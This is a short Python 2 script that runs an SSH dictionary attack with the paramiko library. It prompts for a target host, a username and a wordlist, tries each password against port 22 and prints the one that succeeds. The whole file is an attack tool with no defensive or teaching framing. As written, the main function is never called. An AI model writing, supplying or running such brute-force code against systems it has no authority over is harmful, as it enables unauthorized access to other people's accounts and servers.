#!/usr/bin/python
import os 
import sys
import time
from paramiko import *
from threading import *

def sshda(host,password,user0):
	ssh=SSHClient()
	ssh.load_system_host_keys()
	print "Trying ",password
	try:
		ssh.connect(host, port=22, username=user0, password=password, pkey=None, key_filename=None, timeout=3, allow_agent=True, look_for_keys=True, compress=False)
		print "Dictionary attack succeeded!"
		print "Password is ",password
		sys.exit()
	except:
		pass
	
def main():
	host=raw_input("Host: ")
	user0=raw_input("User: ")
	d0=raw_input("Dictionary file: ")
	pf0=open(d0)
	for line in pf0.readlines():
		password=line.strip('\n')
		sshda(host,password,user0)
